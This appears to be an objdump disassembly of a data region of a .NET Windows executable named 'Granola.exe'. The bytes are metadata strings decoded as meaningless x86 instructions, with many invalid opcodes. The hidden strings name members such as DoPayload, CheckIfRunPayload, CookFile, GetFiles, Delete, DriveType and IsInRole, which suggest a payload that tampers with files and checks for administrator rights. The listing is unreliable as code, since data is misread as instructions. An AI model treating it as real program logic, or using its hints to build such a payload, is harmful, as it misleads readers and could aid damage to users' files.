   1400035eb:	01 16                	add    %edx,(%rsi)
   1400035ed:	02 2f                	add    (%rdi),%ch
   1400035ef:	02 03                	add    (%rbx),%al
   1400035f1:	00 01                	add    %al,(%rcx)
   1400035f3:	00 00                	add    %al,(%rax)
   1400035f5:	00 0c 09             	add    %cl,(%rcx,%rcx,1)
   1400035f8:	8a 02                	mov    (%rdx),%al
   1400035fa:	00 00                	add    %al,(%rax)
   1400035fc:	4a 09 8e 02 02 00 13 	rex.WX or %rcx,0x13000202(%rsi)
   140003603:	00 03                	add    %al,(%rbx)
   140003605:	00 02                	add    %al,(%rdx)
   140003607:	00 15 00 05 00 03    	add    %dl,0x3000500(%rip)        # 0x143003b0d
   14000360d:	00 22                	add    %ah,(%rdx)
   14000360f:	00 23                	add    %ah,(%rbx)
   140003611:	00 03                	add    %al,(%rbx)
   140003613:	00 24 00             	add    %ah,(%rax,%rax,1)
   140003616:	25 00 03 00 26       	and    $0x26000300,%eax
   14000361b:	00 27                	add    %ah,(%rdi)
   14000361d:	00 03                	add    %al,(%rbx)
   14000361f:	00 28                	add    %ch,(%rax)
   140003621:	00 29                	add    %ch,(%rcx)
   140003623:	00 03                	add    %al,(%rbx)
   140003625:	00 2a                	add    %ch,(%rdx)
   140003627:	00 2b                	add    %ch,(%rbx)
   140003629:	00 03                	add    %al,(%rbx)
   14000362b:	00 2c 00             	add    %ch,(%rax,%rax,1)
   14000362e:	2d 00 03 00 2e       	sub    $0x2e000300,%eax
   140003633:	00 2f                	add    %ch,(%rdi)
   140003635:	00 24 00             	add    %ah,(%rax,%rax,1)
   140003638:	33 00                	xor    (%rax),%eax
   14000363a:	8f 00                	pop    (%rax)
   14000363c:	21 02                	and    %eax,(%rdx)
   14000363e:	04 80                	add    $0x80,%al
   140003640:	00 00                	add    %al,(%rax)
   140003642:	01 00                	add    %eax,(%rax)
	...
   140003650:	8d 00                	lea    (%rax),%eax
   140003652:	00 00                	add    %al,(%rax)
   140003654:	04 00                	add    $0x0,%al
	...
   14000365e:	00 00                	add    %al,(%rax)
   140003660:	34 02                	xor    $0x2,%al
   140003662:	95                   	xchg   %eax,%ebp
   140003663:	00 00                	add    %al,(%rax)
   140003665:	00 00                	add    %al,(%rax)
   140003667:	00 04 00             	add    %al,(%rax,%rax,1)
	...
   140003672:	00 00                	add    %al,(%rax)
   140003674:	34 02                	xor    $0x2,%al
   140003676:	1d 05 00 00 00       	sbb    $0x5,%eax
   14000367b:	00 04 00             	add    %al,(%rax,%rax,1)
	...
   140003686:	00 00                	add    %al,(%rax)
   140003688:	34 02                	xor    $0x2,%al
   14000368a:	40 08 00             	rex or %al,(%rax)
   14000368d:	00 00                	add    %al,(%rax)
   14000368f:	00 04 00             	add    %al,(%rax,%rax,1)
	...
   14000369a:	00 00                	add    %al,(%rax)
   14000369c:	34 02                	xor    $0x2,%al
   14000369e:	34 02                	xor    $0x2,%al
   1400036a0:	00 00                	add    %al,(%rax)
   1400036a2:	00 00                	add    %al,(%rax)
   1400036a4:	03 00                	add    (%rax),%eax
   1400036a6:	02 00                	add    (%rax),%al
   1400036a8:	a9 00 bf 01 00       	test   $0x1bf00,%eax
   1400036ad:	00 00                	add    %al,(%rax)
   1400036af:	00 00                	add    %al,(%rax)
   1400036b1:	49                   	rex.WB
   1400036b2:	45 6e                	rex.RB outsb (%rsi),(%dx)
   1400036b4:	75 6d                	jne    0x140003723
   1400036b6:	65 72 61             	gs jb  0x14000371a
   1400036b9:	62 6c 65 60 31       	(bad)
   1400036be:	00 53 74             	add    %dl,0x74(%rbx)
   1400036c1:	61                   	(bad)
   1400036c2:	63 6b 60             	movsxd 0x60(%rbx),%ebp
   1400036c5:	31 00                	xor    %eax,(%rax)
   1400036c7:	49                   	rex.WB
   1400036c8:	45 6e                	rex.RB outsb (%rsi),(%dx)
   1400036ca:	75 6d                	jne    0x140003739
   1400036cc:	65 72 61             	gs jb  0x140003730
   1400036cf:	74 6f                	je     0x140003740
   1400036d1:	72 60                	jb     0x140003733
   1400036d3:	31 00                	xor    %eax,(%rax)
   1400036d5:	4c 69 73 74 60 31 00 	imul   $0x4d003160,0x74(%rbx),%r14
   1400036dc:	4d 
   1400036dd:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%rbx),%esp
   1400036e4:	74 2e                	je     0x140003714
   1400036e6:	57                   	push   %rdi
   1400036e7:	69 6e 33 32 00 3c 70 	imul   $0x703c0032,0x33(%rsi),%ebp
   1400036ee:	65 6e                	outsb  %gs:(%rsi),(%dx)
   1400036f0:	64 69 6e 67 3e 35 5f 	imul   $0x5f5f353e,%fs:0x67(%rsi),%ebp
   1400036f7:	5f 
   1400036f8:	32 00                	xor    (%rax),%al
   1400036fa:	3c 70                	cmp    $0x70,%al
   1400036fc:	61                   	(bad)
   1400036fd:	74 68                	je     0x140003767
   1400036ff:	3e 35 5f 5f 33 00    	ds xor $0x335f5f,%eax
   140003705:	3c 3e                	cmp    $0x3e,%al
   140003707:	37                   	(bad)
   140003708:	5f                   	pop    %rdi
   140003709:	5f                   	pop    %rdi
   14000370a:	77 72                	ja     0x14000377e
   14000370c:	61                   	(bad)
   14000370d:	70 33                	jo     0x140003742
   14000370f:	00 3c 3e             	add    %bh,(%rsi,%rdi,1)
   140003712:	37                   	(bad)
   140003713:	5f                   	pop    %rdi
   140003714:	5f                   	pop    %rdi
   140003715:	77 72                	ja     0x140003789
   140003717:	61                   	(bad)
   140003718:	70 34                	jo     0x14000374e
   14000371a:	00 3c 47             	add    %bh,(%rdi,%rax,2)
   14000371d:	65 74 46             	gs je  0x140003766
   140003720:	69 6c 65 73 3e 64 5f 	imul   $0x5f5f643e,0x73(%rbp,%riz,2),%ebp
   140003727:	5f 
   140003728:	35 00 3c 4d 6f       	xor    $0x6f4d3c00,%eax
   14000372d:	64 75 6c             	fs jne 0x14000379c
   140003730:	65 3e 00 53 79       	gs add %dl,%gs:0x79(%rbx)
   140003735:	73 74                	jae    0x1400037ab
   140003737:	65 6d                	gs insl (%dx),(%rdi)
   140003739:	2e 49                	cs rex.WB
   14000373b:	4f 00 47 72          	rex.WRXB add %r8b,0x72(%r15)
   14000373f:	61                   	(bad)
   140003740:	6e                   	outsb  (%rsi),(%dx)
   140003741:	6f                   	outsl  (%rsi),(%dx)
   140003742:	6c                   	insb   (%dx),(%rdi)
   140003743:	61                   	(bad)
   140003744:	00 6d 73             	add    %ch,0x73(%rbp)
   140003747:	63 6f 72             	movsxd 0x72(%rdi),%ebp
   14000374a:	6c                   	insb   (%dx),(%rdi)
   14000374b:	69 62 00 73 65 74 5f 	imul   $0x5f746573,0x0(%rdx),%esp
   140003752:	56                   	push   %rsi
   140003753:	65 72 62             	gs jb  0x1400037b8
   140003756:	00 53 79             	add    %dl,0x79(%rbx)
   140003759:	73 74                	jae    0x1400037cf
   14000375b:	65 6d                	gs insl (%dx),(%rdi)
   14000375d:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   140003760:	6c                   	insb   (%dx),(%rdi)
   140003761:	6c                   	insb   (%dx),(%rdi)
   140003762:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
   140003767:	6e                   	outsb  (%rsi),(%dx)
   140003768:	73 2e                	jae    0x140003798
   14000376a:	47                   	rex.RXB
   14000376b:	65 6e                	outsb  %gs:(%rsi),(%dx)
   14000376d:	65 72 69             	gs jb  0x1400037d9
   140003770:	63 00                	movsxd (%rax),%eax
   140003772:	67 65 74 5f          	addr32 gs je 0x1400037d5
   140003776:	43 75 72             	rex.XB jne 0x1400037eb
   140003779:	72 65                	jb     0x1400037e0
   14000377b:	6e                   	outsb  (%rsi),(%dx)
   14000377c:	74 4d                	je     0x1400037cb
   14000377e:	61                   	(bad)
   14000377f:	6e                   	outsb  (%rsi),(%dx)
   140003780:	61                   	(bad)
   140003781:	67 65 64 54          	addr32 gs fs push %rsp
   140003785:	68 72 65 61 64       	push   $0x64616572
   14000378a:	49                   	rex.WB
   14000378b:	64 00 3c 3e          	add    %bh,%fs:(%rsi,%rdi,1)
   14000378f:	6c                   	insb   (%dx),(%rdi)
   140003790:	5f                   	pop    %rdi
   140003791:	5f                   	pop    %rdi
   140003792:	69 6e 69 74 69 61 6c 	imul   $0x6c616974,0x69(%rsi),%ebp
   140003799:	54                   	push   %rsp
   14000379a:	68 72 65 61 64       	push   $0x64616572
   14000379f:	49                   	rex.WB
   1400037a0:	64 00 54 68 72       	add    %dl,%fs:0x72(%rax,%rbp,2)
   1400037a5:	65 61                	gs (bad)
   1400037a7:	64 00 72 75          	add    %dh,%fs:0x75(%rdx)
   1400037ab:	6e                   	outsb  (%rsi),(%dx)
   1400037ac:	6e                   	outsb  (%rsi),(%dx)
   1400037ad:	69 6e 67 50 61 79 6c 	imul   $0x6c796150,0x67(%rsi),%ebp
   1400037b4:	6f                   	outsl  (%rsi),(%dx)
   1400037b5:	61                   	(bad)
   1400037b6:	64 00 43 68          	add    %al,%fs:0x68(%rbx)
   1400037ba:	65 63 6b 49          	movsxd %gs:0x49(%rbx),%ebp
   1400037be:	66 52                	push   %dx
   1400037c0:	75 6e                	jne    0x140003830
   1400037c2:	50                   	push   %rax
   1400037c3:	61                   	(bad)
   1400037c4:	79 6c                	jns    0x140003832
   1400037c6:	6f                   	outsl  (%rsi),(%dx)
   1400037c7:	61                   	(bad)
   1400037c8:	64 00 44 6f 50       	add    %al,%fs:0x50(%rdi,%rbp,2)
   1400037cd:	61                   	(bad)
   1400037ce:	79 6c                	jns    0x14000383c
   1400037d0:	6f                   	outsl  (%rsi),(%dx)
   1400037d1:	61                   	(bad)
   1400037d2:	64 00 41 64          	add    %al,%fs:0x64(%rcx)
   1400037d6:	64 00 67 65          	add    %ah,%fs:0x65(%rdi)
   1400037da:	74 5f                	je     0x14000383b
   1400037dc:	53                   	push   %rbx
   1400037dd:	74 61                	je     0x140003840
   1400037df:	63 6b 54             	movsxd 0x54(%rbx),%ebp
   1400037e2:	72 61                	jb     0x140003845
   1400037e4:	63 65 00             	movsxd 0x0(%rbp),%esp
   1400037e7:	67 65 74 5f          	addr32 gs je 0x14000384a
   1400037eb:	4d                   	rex.WRB
   1400037ec:	65 73 73             	gs jae 0x140003862
   1400037ef:	61                   	(bad)
   1400037f0:	67 65 00 6d 65       	add    %ch,%gs:0x65(%ebp)
   1400037f5:	73 73                	jae    0x14000386a
   1400037f7:	61                   	(bad)
   1400037f8:	67 65 00 49 45       	add    %cl,%gs:0x45(%ecx)
   1400037fd:	6e                   	outsb  (%rsi),(%dx)
   1400037fe:	75 6d                	jne    0x14000386d
   140003800:	65 72 61             	gs jb  0x140003864
   140003803:	62 6c 65 00 49       	(bad)
   140003808:	44 69 73 70 6f 73 61 	imul   $0x6261736f,0x70(%rbx),%r14d
   14000380f:	62 
   140003810:	6c                   	insb   (%dx),(%rdi)
   140003811:	65 00 43 6f          	add    %al,%gs:0x6f(%rbx)
   140003815:	6f                   	outsl  (%rsi),(%dx)
   140003816:	6b 46 69 6c          	imul   $0x6c,0x69(%rsi),%eax
   14000381a:	65 00 66 69          	add    %ah,%gs:0x69(%rsi)
   14000381e:	6c                   	insb   (%dx),(%rdi)
   14000381f:	65 00 49 73          	add    %cl,%gs:0x73(%rcx)
   140003823:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140003825:	52                   	push   %rdx
   140003826:	6f                   	outsl  (%rsi),(%dx)
   140003827:	6c                   	insb   (%dx),(%rdi)
   140003828:	65 00 57 69          	add    %dl,%gs:0x69(%rdi)
   14000382c:	6e                   	outsb  (%rsi),(%dx)
   14000382d:	64 6f                	outsl  %fs:(%rsi),(%dx)
   14000382f:	77 73                	ja     0x1400038a4
   140003831:	42 75 69             	rex.X jne 0x14000389d
   140003834:	6c                   	insb   (%dx),(%rdi)
   140003835:	74 49                	je     0x140003880
   140003837:	6e                   	outsb  (%rsi),(%dx)
   140003838:	52                   	push   %rdx
   140003839:	6f                   	outsl  (%rsi),(%dx)
   14000383a:	6c                   	insb   (%dx),(%rdi)
   14000383b:	65 00 67 65          	add    %ah,%gs:0x65(%rdi)
   14000383f:	74 5f                	je     0x1400038a0
   140003841:	4d 61                	rex.WRB (bad)
   140003843:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%rsi),%ebp
   14000384a:	65 00 50 72          	add    %dl,%gs:0x72(%rax)
   14000384e:	6f                   	outsl  (%rsi),(%dx)
   14000384f:	63 65 73             	movsxd 0x73(%rbp),%esp
   140003852:	73 4d                	jae    0x1400038a1
   140003854:	6f                   	outsl  (%rsi),(%dx)
   140003855:	64 75 6c             	fs jne 0x1400038c4
   140003858:	65 00 67 65          	add    %ah,%gs:0x65(%rdi)
   14000385c:	74 5f                	je     0x1400038bd
   14000385e:	46 69 6c 65 4e 61 6d 	imul   $0x656d61,0x4e(%rbp,%r12,2),%r13d
   140003865:	65 00 
   140003867:	73 65                	jae    0x1400038ce
   140003869:	74 5f                	je     0x1400038ca
   14000386b:	46 69 6c 65 4e 61 6d 	imul   $0x656d61,0x4e(%rbp,%r12,2),%r13d
   140003872:	65 00 
   140003874:	47                   	rex.RXB
   140003875:	65 74 46             	gs je  0x1400038be
   140003878:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%rbp,%riz,2),%ebp
   14000387f:	00 
   140003880:	67 65 74 5f          	addr32 gs je 0x1400038e3
   140003884:	46 75 6c             	rex.RX jne 0x1400038f3
   140003887:	6c                   	insb   (%dx),(%rdi)
   140003888:	4e 61                	rex.WRX (bad)
   14000388a:	6d                   	insl   (%dx),(%rdi)
   14000388b:	65 00 67 65          	add    %ah,%gs:0x65(%rdi)
   14000388f:	74 5f                	je     0x1400038f0
   140003891:	50                   	push   %rax
   140003892:	72 6f                	jb     0x140003903
   140003894:	63 65 73             	movsxd 0x73(%rbp),%esp
   140003897:	73 4e                	jae    0x1400038e7
   140003899:	61                   	(bad)
   14000389a:	6d                   	insl   (%dx),(%rdi)
   14000389b:	65 00 70 72          	add    %dh,%gs:0x72(%rax)
   14000389f:	6f                   	outsl  (%rsi),(%dx)
   1400038a0:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400038a3:	73 4e                	jae    0x1400038f3
   1400038a5:	61                   	(bad)
   1400038a6:	6d                   	insl   (%dx),(%rdi)
   1400038a7:	65 00 47 65          	add    %al,%gs:0x65(%rdi)
   1400038ab:	74 50                	je     0x1400038fd
   1400038ad:	72 6f                	jb     0x14000391e
   1400038af:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400038b2:	73 65                	jae    0x140003919
   1400038b4:	73 42                	jae    0x1400038f8
   1400038b6:	79 4e                	jns    0x140003906
   1400038b8:	61                   	(bad)
   1400038b9:	6d                   	insl   (%dx),(%rdi)
   1400038ba:	65 00 47 65          	add    %al,%gs:0x65(%rdi)
   1400038be:	74 44                	je     0x140003904
   1400038c0:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%rdx),%esi
   1400038c7:	79 4e                	jns    0x140003917
   1400038c9:	61                   	(bad)
   1400038ca:	6d                   	insl   (%dx),(%rdi)
   1400038cb:	65 00 44 61 74       	add    %al,%gs:0x74(%rcx,%riz,2)
   1400038d0:	65 54                	gs push %rsp
   1400038d2:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%rbp),%ebp
   1400038d9:	5f                   	pop    %rdi
   1400038da:	44 72 69             	rex.R jb 0x140003946
   1400038dd:	76 65                	jbe    0x140003944
   1400038df:	54                   	push   %rsp
   1400038e0:	79 70                	jns    0x140003952
   1400038e2:	65 00 53 79          	add    %dl,%gs:0x79(%rbx)
   1400038e6:	73 74                	jae    0x14000395c
   1400038e8:	65 6d                	gs insl (%dx),(%rdi)
   1400038ea:	2e 43 6f             	cs rex.XB outsl (%rsi),(%dx)
   1400038ed:	72 65                	jb     0x140003954
   1400038ef:	00 67 65             	add    %ah,0x65(%rdi)
   1400038f2:	74 5f                	je     0x140003953
   1400038f4:	49 6e                	rex.WB outsb (%rsi),(%dx)
   1400038f6:	76 61                	jbe    0x140003959
   1400038f8:	72 69                	jb     0x140003963
   1400038fa:	61                   	(bad)
   1400038fb:	6e                   	outsb  (%rsi),(%dx)
   1400038fc:	74 43                	je     0x140003941
   1400038fe:	75 6c                	jne    0x14000396c
   140003900:	74 75                	je     0x140003977
   140003902:	72 65                	jb     0x140003969
   140003904:	00 53 79             	add    %dl,0x79(%rbx)
   140003907:	73 74                	jae    0x14000397d
   140003909:	65 6d                	gs insl (%dx),(%rdi)
   14000390b:	2e 49                	cs rex.WB
   14000390d:	44 69 73 70 6f 73 61 	imul   $0x6261736f,0x70(%rbx),%r14d
   140003914:	62 
   140003915:	6c                   	insb   (%dx),(%rdi)
   140003916:	65 2e 44 69 73 70 6f 	gs imul $0x65736f,%gs:0x70(%rbx),%r14d
   14000391d:	73 65 00 
   140003920:	3c 3e                	cmp    $0x3e,%al
   140003922:	31 5f 5f             	xor    %ebx,0x5f(%rdi)
   140003925:	73 74                	jae    0x14000399b
   140003927:	61                   	(bad)
   140003928:	74 65                	je     0x14000398f
   14000392a:	00 44 65 6c          	add    %al,0x6c(%rbp,%riz,2)
   14000392e:	65 74 65             	gs je  0x140003996
   140003931:	00 43 6f             	add    %al,0x6f(%rbx)
   140003934:	6d                   	insl   (%dx),(%rdi)
   140003935:	70 69                	jo     0x1400039a0
   140003937:	6c                   	insb   (%dx),(%rdi)
   140003938:	65 72 47             	gs jb  0x140003982
   14000393b:	65 6e                	outsb  %gs:(%rsi),(%dx)
   14000393d:	65 72 61             	gs jb  0x1400039a1
   140003940:	74 65                	je     0x1400039a7
   140003942:	64 41 74 74          	fs rex.B je 0x1400039ba
   140003946:	72 69                	jb     0x1400039b1
   140003948:	62 75 74 65 00       	(bad)
   14000394d:	47 75 69             	rex.RXB jne 0x1400039b9
   140003950:	64 41 74 74          	fs rex.B je 0x1400039c8
   140003954:	72 69                	jb     0x1400039bf
   140003956:	62 75 74 65 00       	(bad)
   14000395b:	44                   	rex.R
   14000395c:	65 62 75 67 67 61    	(bad)
   140003962:	62 6c 65 41 74       	(bad)
   140003967:	74 72                	je     0x1400039db
   140003969:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%rdx),%esp
   140003970:	6f                   	outsl  (%rsi),(%dx)
   140003971:	6d                   	insl   (%dx),(%rdi)
   140003972:	56                   	push   %rsi
   140003973:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%rbx),%esi
   14000397a:	74 74                	je     0x1400039f0
   14000397c:	72 69                	jb     0x1400039e7
   14000397e:	62 75 74 65 00       	(bad)
   140003983:	41 73 73             	rex.B jae 0x1400039f9
   140003986:	65 6d                	gs insl (%dx),(%rdi)
   140003988:	62 6c 79 54 69       	(bad)
   14000398d:	74 6c                	je     0x1400039fb
   14000398f:	65 41 74 74          	gs rex.B je 0x140003a07
   140003993:	72 69                	jb     0x1400039fe
   140003995:	62 75 74 65 00       	(bad)
   14000399a:	49 74 65             	rex.WB je 0x140003a02
   14000399d:	72 61                	jb     0x140003a00
   14000399f:	74 6f                	je     0x140003a10
   1400039a1:	72 53                	jb     0x1400039f6
   1400039a3:	74 61                	je     0x140003a06
   1400039a5:	74 65                	je     0x140003a0c
   1400039a7:	4d 61                	rex.WRB (bad)
   1400039a9:	63 68 69             	movsxd 0x69(%rax),%ebp
   1400039ac:	6e                   	outsb  (%rsi),(%dx)
   1400039ad:	65 41 74 74          	gs rex.B je 0x140003a25
   1400039b1:	72 69                	jb     0x140003a1c
   1400039b3:	62 75 74 65 00       	(bad)
   1400039b8:	41 73 73             	rex.B jae 0x140003a2e
   1400039bb:	65 6d                	gs insl (%dx),(%rdi)
   1400039bd:	62 6c 79 54 72       	(bad)
   1400039c2:	61                   	(bad)
   1400039c3:	64 65 6d             	fs gs insl (%dx),(%rdi)
   1400039c6:	61                   	(bad)
   1400039c7:	72 6b                	jb     0x140003a34
   1400039c9:	41 74 74             	rex.B je 0x140003a40
   1400039cc:	72 69                	jb     0x140003a37
   1400039ce:	62 75 74 65 00       	(bad)
   1400039d3:	54                   	push   %rsp
   1400039d4:	61                   	(bad)
   1400039d5:	72 67                	jb     0x140003a3e
   1400039d7:	65 74 46             	gs je  0x140003a20
   1400039da:	72 61                	jb     0x140003a3d
   1400039dc:	6d                   	insl   (%dx),(%rdi)
   1400039dd:	65 77 6f             	gs ja  0x140003a4f
   1400039e0:	72 6b                	jb     0x140003a4d
   1400039e2:	41 74 74             	rex.B je 0x140003a59
   1400039e5:	72 69                	jb     0x140003a50
   1400039e7:	62 75 74 65 00       	(bad)
   1400039ec:	44                   	rex.R
   1400039ed:	65 62 75 67 67 65    	(bad)
   1400039f3:	72 48                	jb     0x140003a3d
   1400039f5:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%rsp,%riz,2),%esp
   1400039fc:	74 
   1400039fd:	72 69                	jb     0x140003a68
   1400039ff:	62 75 74 65 00       	(bad)
   140003a04:	41 73 73             	rex.B jae 0x140003a7a
   140003a07:	65 6d                	gs insl (%dx),(%rdi)
   140003a09:	62 6c 79 46 69       	(bad)
   140003a0e:	6c                   	insb   (%dx),(%rdi)
   140003a0f:	65 56                	gs push %rsi
   140003a11:	65 72 73             	gs jb  0x140003a87
   140003a14:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%rdi),%ebp
   140003a1b:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%rdx),%esp
   140003a22:	73 73                	jae    0x140003a97
   140003a24:	65 6d                	gs insl (%dx),(%rdi)
   140003a26:	62 6c 79 43 6f       	(bad)
   140003a2b:	6e                   	outsb  (%rsi),(%dx)
   140003a2c:	66 69 67 75 72 61    	imul   $0x6172,0x75(%rdi),%sp
   140003a32:	74 69                	je     0x140003a9d
   140003a34:	6f                   	outsl  (%rsi),(%dx)
   140003a35:	6e                   	outsb  (%rsi),(%dx)
   140003a36:	41 74 74             	rex.B je 0x140003aad
   140003a39:	72 69                	jb     0x140003aa4
   140003a3b:	62 75 74 65 00       	(bad)
   140003a40:	41 73 73             	rex.B jae 0x140003ab6
   140003a43:	65 6d                	gs insl (%dx),(%rdi)
   140003a45:	62 6c 79 44 65       	(bad)
   140003a4a:	73 63                	jae    0x140003aaf
   140003a4c:	72 69                	jb     0x140003ab7
   140003a4e:	70 74                	jo     0x140003ac4
   140003a50:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%rdi),%ebp
   140003a57:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%rdx),%esp
   140003a5e:	6f                   	outsl  (%rsi),(%dx)
   140003a5f:	6d                   	insl   (%dx),(%rdi)
   140003a60:	70 69                	jo     0x140003acb
   140003a62:	6c                   	insb   (%dx),(%rdi)
   140003a63:	61                   	(bad)
   140003a64:	74 69                	je     0x140003acf
   140003a66:	6f                   	outsl  (%rsi),(%dx)
   140003a67:	6e                   	outsb  (%rsi),(%dx)
   140003a68:	52                   	push   %rdx
   140003a69:	65 6c                	gs insb (%dx),(%rdi)
   140003a6b:	61                   	(bad)
   140003a6c:	78 61                	js     0x140003acf
   140003a6e:	74 69                	je     0x140003ad9
   140003a70:	6f                   	outsl  (%rsi),(%dx)
   140003a71:	6e                   	outsb  (%rsi),(%dx)
   140003a72:	73 41                	jae    0x140003ab5
   140003a74:	74 74                	je     0x140003aea
   140003a76:	72 69                	jb     0x140003ae1
   140003a78:	62 75 74 65 00       	(bad)
   140003a7d:	41 73 73             	rex.B jae 0x140003af3
   140003a80:	65 6d                	gs insl (%dx),(%rdi)
   140003a82:	62 6c 79 50 72       	(bad)
   140003a87:	6f                   	outsl  (%rsi),(%dx)
   140003a88:	64 75 63             	fs jne 0x140003aee
   140003a8b:	74 41                	je     0x140003ace
   140003a8d:	74 74                	je     0x140003b03
   140003a8f:	72 69                	jb     0x140003afa
   140003a91:	62 75 74 65 00       	(bad)
   140003a96:	41 73 73             	rex.B jae 0x140003b0c
   140003a99:	65 6d                	gs insl (%dx),(%rdi)
   140003a9b:	62 6c 79 43 6f       	(bad)
   140003aa0:	70 79                	jo     0x140003b1b
   140003aa2:	72 69                	jb     0x140003b0d
   140003aa4:	67 68 74 41 74 74    	addr32 push $0x74744174
   140003aaa:	72 69                	jb     0x140003b15
   140003aac:	62 75 74 65 00       	(bad)
   140003ab1:	41 73 73             	rex.B jae 0x140003b27
   140003ab4:	65 6d                	gs insl (%dx),(%rdi)
   140003ab6:	62 6c 79 43 6f       	(bad)
   140003abb:	6d                   	insl   (%dx),(%rdi)
   140003abc:	70 61                	jo     0x140003b1f
   140003abe:	6e                   	outsb  (%rsi),(%dx)
   140003abf:	79 41                	jns    0x140003b02
   140003ac1:	74 74                	je     0x140003b37
   140003ac3:	72 69                	jb     0x140003b2e
   140003ac5:	62 75 74 65 00       	(bad)
   140003aca:	52                   	push   %rdx
   140003acb:	75 6e                	jne    0x140003b3b
   140003acd:	74 69                	je     0x140003b38
   140003acf:	6d                   	insl   (%dx),(%rdi)
   140003ad0:	65 43 6f             	rex.XB outsl %gs:(%rsi),(%dx)
   140003ad3:	6d                   	insl   (%dx),(%rdi)
   140003ad4:	70 61                	jo     0x140003b37
   140003ad6:	74 69                	je     0x140003b41
   140003ad8:	62 69 6c 69 74       	(bad)
   140003add:	79 41                	jns    0x140003b20
   140003adf:	74 74                	je     0x140003b55
   140003ae1:	72 69                	jb     0x140003b4c
   140003ae3:	62 75 74 65 00       	(bad)
   140003ae8:	42 79 74             	rex.X jns 0x140003b5f
   140003aeb:	65 00 47 65          	add    %al,%gs:0x65(%rdi)
   140003aef:	74 56                	je     0x140003b47
   140003af1:	61                   	(bad)
   140003af2:	6c                   	insb   (%dx),(%rdi)
   140003af3:	75 65                	jne    0x140003b5a
   140003af5:	00 53 65             	add    %dl,0x65(%rbx)
   140003af8:	74 56                	je     0x140003b50
   140003afa:	61                   	(bad)
   140003afb:	6c                   	insb   (%dx),(%rdi)
   140003afc:	75 65                	jne    0x140003b63
   140003afe:	00 47 72             	add    %al,0x72(%rdi)
   140003b01:	61                   	(bad)
   140003b02:	6e                   	outsb  (%rsi),(%dx)
   140003b03:	6f                   	outsl  (%rsi),(%dx)
   140003b04:	6c                   	insb   (%dx),(%rdi)
   140003b05:	61                   	(bad)
   140003b06:	2e 65 78 65          	cs js,pn 0x140003b6f
   140003b0a:	00 4c 61 73          	add    %cl,0x73(%rcx,%riz,2)
   140003b0e:	74 49                	je     0x140003b59
   140003b10:	6e                   	outsb  (%rsi),(%dx)
   140003b11:	64 65 78 4f          	fs gs js 0x140003b64
   140003b15:	66 00 53 79          	data16 add %dl,0x79(%rbx)
   140003b19:	73 74                	jae    0x140003b8f
   140003b1b:	65 6d                	gs insl (%dx),(%rdi)
   140003b1d:	2e 54                	cs push %rsp
   140003b1f:	68 72 65 61 64       	push   $0x64616572
   140003b24:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%rsi),%ebp
   140003b2b:	74 65                	je     0x140003b92
   140003b2d:	6d                   	insl   (%dx),(%rdi)
   140003b2e:	2e 52                	cs push %rdx
   140003b30:	75 6e                	jne    0x140003ba0
   140003b32:	74 69                	je     0x140003b9d
   140003b34:	6d                   	insl   (%dx),(%rdi)
   140003b35:	65 2e 56             	gs cs push %rsi
   140003b38:	65 72 73             	gs jb  0x140003bae
   140003b3b:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%rdi),%ebp
   140003b42:	54                   	push   %rsp
   140003b43:	6f                   	outsl  (%rsi),(%dx)
   140003b44:	53                   	push   %rbx
   140003b45:	74 72                	je     0x140003bb9
   140003b47:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%rsi),%ebp
   140003b4e:	73 74                	jae    0x140003bc4
   140003b50:	72 69                	jb     0x140003bbb
   140003b52:	6e                   	outsb  (%rsi),(%dx)
   140003b53:	67 00 44 65 62       	add    %al,0x62(%ebp,%eiz,2)
   140003b58:	75 67                	jne    0x140003bc1
   140003b5a:	4c 6f                	rex.WR outsl (%rsi),(%dx)
   140003b5c:	67 00 50 75          	add    %dl,0x75(%eax)
   140003b60:	73 68                	jae    0x140003bca
   140003b62:	00 47 65             	add    %al,0x65(%rdi)
   140003b65:	74 46                	je     0x140003bad
   140003b67:	6f                   	outsl  (%rsi),(%dx)
   140003b68:	6c                   	insb   (%dx),(%rdi)
   140003b69:	64 65 72 50          	fs gs jb 0x140003bbd
   140003b6d:	61                   	(bad)
   140003b6e:	74 68                	je     0x140003bd8
   140003b70:	00 70 61             	add    %dh,0x61(%rax)
   140003b73:	74 68                	je     0x140003bdd
   140003b75:	00 67 65             	add    %ah,0x65(%rdi)
   140003b78:	74 5f                	je     0x140003bd9
   140003b7a:	4c                   	rex.WR
   140003b7b:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140003b7d:	67 74 68             	addr32 je 0x140003be8
   140003b80:	00 53 79             	add    %dl,0x79(%rbx)
   140003b83:	73 74                	jae    0x140003bf9
   140003b85:	65 6d                	gs insl (%dx),(%rdi)
   140003b87:	2e 53                	cs push %rbx
   140003b89:	65 63 75 72          	movsxd %gs:0x72(%rbp),%esi
   140003b8d:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%rcx,%rdi,2),%esi
   140003b94:	6e 
   140003b95:	63 69 70             	movsxd 0x70(%rcx),%ebp
   140003b98:	61                   	(bad)
   140003b99:	6c                   	insb   (%dx),(%rdi)
   140003b9a:	00 57 69             	add    %dl,0x69(%rdi)
   140003b9d:	6e                   	outsb  (%rsi),(%dx)
   140003b9e:	64 6f                	outsl  %fs:(%rsi),(%dx)
   140003ba0:	77 73                	ja     0x140003c15
   140003ba2:	50                   	push   %rax
   140003ba3:	72 69                	jb     0x140003c0e
